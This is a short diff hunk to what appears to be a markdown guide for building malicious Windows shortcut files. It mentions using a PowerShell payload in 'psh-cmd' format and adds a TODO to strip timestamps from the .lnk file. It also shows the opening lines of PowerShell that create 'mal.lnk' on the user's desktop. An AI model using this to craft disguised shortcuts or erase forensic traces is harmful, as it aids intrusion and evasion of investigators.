@@ -14,6 +14,8 @@ If you're using powershell payload then it's recommended to use `psh-cmd` format
 
 ---
 
+TODO: Remove timestamps in the .lnk file
+
 ```powershell
 $shortcutPath = "C:\Users\" + $env:username + "\Desktop\mal.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
